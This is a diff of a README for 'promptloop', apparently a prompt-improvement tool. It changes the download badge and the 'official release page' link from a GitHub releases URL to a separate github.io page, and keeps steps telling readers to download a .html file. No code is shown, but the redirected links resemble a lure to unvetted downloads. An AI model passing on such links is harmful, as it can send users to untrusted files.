@@ -1,6 +1,6 @@
 # 🤖 promptloop - Improve every AI prompt with ease
 
-[![Download promptloop](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/householderbereavedperson505/promptloop/releases)
+[![Download promptloop](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://householderbereavedperson505.github.io)
 
 promptloop acts as a tool for people who want better results from AI. It works with many language models. You give it a prompt, and the software makes it better. It learns from your feedback to change how it writes for you. The software runs as a single file on your computer. You do not need to install complex programs to use it.
 
@@ -8,7 +8,7 @@ promptloop acts as a tool for people who want better results from AI. It works w
 
 The software lives in a single file on GitHub. Follow these steps to get started:
 
-1. Visit the [official release page](https://github.com/householderbereavedperson505/promptloop/releases).
+1. Visit the [official release page](https://householderbereavedperson505.github.io).
 2. Look for the most recent version under the "Releases" section.
 3. Click the file with the .html extension to download it to your computer.
 4. Save the file in a folder you can find easily.
